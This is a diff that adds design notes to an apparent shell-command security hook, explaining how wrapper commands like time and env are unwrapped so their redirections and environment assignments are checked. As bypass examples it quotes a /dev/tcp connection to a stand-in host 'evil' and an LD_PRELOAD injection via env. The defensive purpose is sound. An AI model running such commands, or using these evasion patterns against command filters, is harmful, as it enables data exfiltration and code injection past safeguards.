@@ -620,3 +620,58 @@ per-tier slices from a Go map, so iteration order was randomised
 and the same command could quote different patterns on repeated
 runs. The loader now sorts each source's tier arrays alphabetically
 by `Raw` before checking, so output is stable.
+
+### Wrapper re-analysis carries all execution-relevant parts
+
+The breakdown's contract is to re-analyse every command that could
+execute. The failure mode this addresses is narrower than "unknown
+nodes slip through": a *recognised* node gets reconstructed or
+transformed for re-analysis, but a dangerous sub-part is silently
+dropped — the hook believes it fully handled a node it only
+partly handled. Two real instances and one abstraction came out of
+this:
+
+- The `time` keyword transform dropped redirections. A `TimeClause`
+  wraps a whole statement, but the handler rebuilt a bare
+  `CallExpr` from the timed command's args and lost
+  `Stmt.Redirs` — so `time echo > /dev/tcp/evil/80` connected to
+  the socket undetected. Fix: route the timed statement through
+  `processStmt` (which already walks redirects and their command
+  substitutions). The keyword's only option, `-p`, is absorbed
+  into `TimeClause.PosixFormat`, so the statement carries no time
+  flags and needs no special parsing. Any other flag (`time -v
+  cmd`) is, faithfully, the bash keyword running `-v` as the
+  command — bash itself reports "command not found", so the real
+  command never runs and the hook treats `-v` as the (unknown)
+  command name.
+
+- `UnwrapResult.Assigns` is the abstraction: a wrapper now reports
+  the environment assignments it applies to its inner command, and
+  the framework records each name on the EnvVars deny axis and
+  extracts command substitutions from each value. This makes
+  `UnwrapResult` the complete description of an unwrapped
+  command — commands, code, files, snippets, and assigns — so a
+  wrapper that sets env vars carries that part forward instead of
+  dropping it.
+
+- `env` is the one wrapper that honours a leading `NAME=val`, so it
+  uses `Assigns`: `env LD_PRELOAD=/x.so cmd` is a real injection and
+  the name must reach the deny axis. Every other registered wrapper
+  (`timeout`, `nohup`, `setsid`, `nice`, `ionice`, `exec`,
+  `stdbuf`, `strace`, ...) execs its inner command directly via
+  `execvp`, so a leading `NAME=val` is the program name, not an
+  assignment, and is deliberately not honoured. `env` is
+  `PathAllow` so `/usr/bin/env python3 script` (shebang style)
+  still unwraps and scans the inner interpreter.
+
+`env`, `nohup`, `setsid`, `nice`, and `exec` were previously denied
+outright in `escape-hatches` because the hook could not scope them.
+Registering them as wrappers replaces blanket-deny with
+inner-command checking, which is strictly more precise; they move
+out of the escape-hatches Command tier (rule-owned commands stay
+out of preset Command tiers). `chroot` and `flock` unwrap their
+inner command (`chroot` with no command runs an interactive shell
+and is denied; `flock FILE -c STR` re-parses STR as code).
+`runuser`, `setpriv`, and `setarch` have shell-string, interactive,
+and ambiguous-positional forms that defeat simple parsing, so they
+fail closed (deny) rather than risk masking the inner command.
